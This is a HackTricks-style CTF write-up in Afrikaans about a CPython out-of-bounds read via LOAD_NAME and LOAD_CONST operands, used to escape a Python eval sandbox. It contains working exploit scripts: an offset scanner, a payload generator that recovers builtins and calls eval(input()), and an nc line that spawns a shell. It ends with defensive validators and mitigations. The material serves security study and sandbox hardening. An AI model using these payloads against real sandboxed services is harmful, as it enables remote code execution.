# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

Hierdie bladsy pas Splitline se oorspronklike HITCON CTF 2022 "V O I D" writeup en exploit chain aan.<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

'n `LOAD_NAME`- of `LOAD_CONST`-operand kan buite 'n doelbewus verkorte `co_names`- of `co_consts`-tuple lees. In hierdie uitdaging word onbereikbare dummy names gebruik totdat 'n nabygeleë inskrywing 'n nuttige attribute soos `__getattribute__` bevat.<sup>[[1]](#references)</sup>

Die oorblywende payload hergebruik daardie herwonne naam om 'n sandbox escape te bou.<sup>[[1]](#references)</sup>

### Oorsig <a href="#overview-1" id="overview-1"></a>

Die uitdaging se wrapper is kort en compileer een uitdrukking voordat dit evalueer word:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
Die invoer word in ’n Python-kodeobjek saamgestel, waarna die wrapper sy `co_consts` en `co_names` met leë tuples vervang voordat `eval` geroep word.<sup>[[1]](#references)[[5]](#references)</sup>

Enige gegenereerde instruksie wat steeds een van daardie tabelle indekseer, kan die interpreter laat crash of ’n aangrensende objekpointer blootlê, afhangend van die build.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Hoe gebeur die segfault?

Vir ’n lysuitdrukking soos `[a, b, c]` genereer die compiler `LOAD_NAME`-instruksies met opeenvolgende operands:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
As `co_names` met `()` vervang word, bevat die bytecode steeds `LOAD_NAME 2`; ’n onkontroleerde tuple-toegang kan dus ’n pointer buite die tuple haal in plaas daarvan om `IndexError` te veroorsaak.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` en `LOAD_CONST` is die kernprimitiewe hier: hul heelgetaloperande kies onderskeidelik inskrywings in `co_names` en `co_consts`.<sup>[[1]](#references)[[2]](#references)</sup>

In CPython se dispatch haal `LOAD_CONST` die geselekteerde tuple-inskrywing op en plaas dit op die stack; release builds gebruik ’n onkontroleerde tuple-accessor:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Toets toenemende `LOAD_NAME`-operande op die teikeninterpreter om bruikbare inskrywings te karteer. Splitline het bruikbare offsets bo 700 in die challenge-omgewing waargeneem, maar die uitleg is build-spesifiek; ’n debugger kan help om die omliggende geheue te inspekteer.<sup>[[1]](#references)</sup>

### Generering van die Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Sodra ’n offset ’n bruikbare naam oplewer, plaas die out-of-range lookup in ’n onbereikbare uitdrukking en verwys na dieselfde `co_names`-gleuf vanuit ’n bereikbare attribuuttoegang.<sup>[[1]](#references)</sup>

Byvoorbeeld, as offset 5 `__getattribute__` oplewer, hou daardie naam in gleuf 5 terwyl die vals tak die bruikbare lookup uitvoer:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> Die herstelde teks hoef nie `__getattribute__` te wees nie; enige identifier wat die payload bevat, kan die plek inneem.<sup>[[1]](#references)</sup>

Die compiler hergebruik ’n `co_names`-slot vir herhaalde voorkomste van dieselfde naam, soos die disassembly illustreer:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Omdat `LOAD_ATTR` sy naam ook deur `co_names` oplos, kan die bereikbare vertakking daardie slot hergebruik; gepakte operande op nuwer CPython-weergawes word in die weergawe-notas hieronder beskryf.<sup>[[1]](#references)[[2]](#references)</sup>

Klein nie-negatiewe heelgetalle kan met Boolese uitdrukkings sonder constants saamgestel word:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Die oorspronklike exploit het names eerder as constants gebruik om binne die uitdaging se lengtebeperking te bly.<sup>[[1]](#references)</sup>

Hierdie helper skandeer kandidaat-name-offsets deur ’n code object met ’n leë `co_names`-tuple te konstrueer.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
Die generator hieronder karteer die herstelde offsets na name en genereer die bronvlak-payload.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Op ’n hoë vlak verkry die gegenereerde payload ’n funksie se globale naamruimte, herwin `builtins` en roep `eval(input())` aan.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Weergawe-aantekeninge en geaffekteerde opcodes (Python 3.11–3.13)

- Op CPython 3.11–3.13 gebruik instruksies steeds heelgetal-operande om die konstante- en naamtabelle van die kode-objek te indekseer. As enige tuple korter is as ’n indeks waarna verwys word, kan ’n ongekontroleerde toegang ’n aangrensende objek-aanwyser lees en ’n crash veroorsaak of daarop opereer; die presiese gedrag hang van die interpreter-bou af.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` en (3.12+) `RETURN_CONST consti` lees `co_consts[consti]`.<sup>[[2]](#references)</sup>
- Direkte gebruikers van die naamtabel sluit in `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR`, en (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` en `LOAD_ATTR namei` gebruik `co_names[namei >> 1]`; die lae bis beheer die gedokumenteerde NULL/metode-gedrag. (3.12+) `LOAD_SUPER_ATTR namei` gebruik `co_names[namei >> 2]` en pak twee vlae in sy lae bisse.<sup>[[2]](#references)</sup>
- Python 3.11+ het adaptiewe/inline caches bekendgestel wat versteekte `CACHE`-inskrywings tussen instruksies byvoeg. Handgemaakte bytecode moet hierdie inskrywings in ag neem wanneer `co_code` gebou word.<sup>[[2]](#references)</sup>

Praktiese implikasie: bytecode-uitleg en herwonne offsets is vrystelling- en bou-spesifiek. Toets die tegniek en enige gegenereerde payload teen die teiken se CPython-weergawe voordat jy daarop staatmaak.<sup>[[2]](#references)</sup>

### Vinnige skandeerder vir nuttige OOB-indekse (versoenbaar met 3.11+/3.12+)

As jy verkies om direk vanaf bytecode vir interessante objekte te soek eerder as vanaf hoëvlakbronkode, kan jy minimale kode-objekte genereer en indekse brute-force. Die helper hieronder voeg inline caches in volgens die teiken-interpreter se `dis`-metadata.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notas
- Om eerder name te toets, vervang `LOAD_CONST` met `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` en pas die stack-gebruik en gepakte operand vir die teikenopcode aan.<sup>[[2]](#references)</sup>
- Gebruik `EXTENDED_ARG` of veelvuldige grepe van `arg` om indekse >255 te bereik indien nodig. Hierdie helper stuur slegs die lae operand-greep uit, dus vereis groter indekse rou greep-konstruksie of veelvuldige loads.<sup>[[2]](#references)</sup>

### Minimale bytecode-only RCE-patroon (co_consts OOB → builtins → eval/input)

Sodra jy ’n `co_consts`-indeks identifiseer wat na die builtins-module resolve, kan jy `eval(input())` sonder `co_names` rekonstrueer deur die stack te manipuleer. Die amptelike B01lers CTF 2024 `awpcode`-materiaal dokumenteer dieselfde OOB-read-patroon.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Hierdie stack-only-benadering is nuttig wanneer ’n challenge jou direkte beheer oor `co_code` gee terwyl `co_consts=()` en `co_names=()` afgedwing word; dit vermy source-level tricks en kan payloads klein hou deur bytecode-stackbewerkings en tuple-builders te gebruik.<sup>[[4]](#references)</sup>

### Defensiewe kontroles en mitigations vir sandboxes

As jy ’n Python-sandbox skryf wat untrusted code compileer of evalueer, moenie op CPython staatmaak om tuple-indekse wat deur bytecode gebruik word, binne perke te kontroleer nie. Valideer code objects voordat jy hulle uitvoer.<sup>[[2]](#references)[[3]](#references)</sup>

Praktiese validator (verwerp OOB-toegang tot co_consts/co_names).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Bykomende mitigation-idees
- Moenie arbitrêre `CodeType.replace(...)` op onbetroubare invoer toelaat nie, of voeg streng strukturele kontroles by die resulterende code object.
- Oorweeg dit om onbetroubare code in ’n aparte proses met OS-vlak-sandboxing (seccomp, job objects, containers) uit te voer, eerder as om op CPython-semantiek staat te maak.

## References

- [1] [Splitline se HITCON CTF 2022 writeup "V O I D" (oorsprong van hierdie tegniek en die exploit chain op hoë vlak)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python 3.13 `dis`-dokumentasie (bytecode-indekse, packed name operands en inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [CPython 3.13.5 tuple-access macros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [B01lers CTF 2024 `awpcode` challenge writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
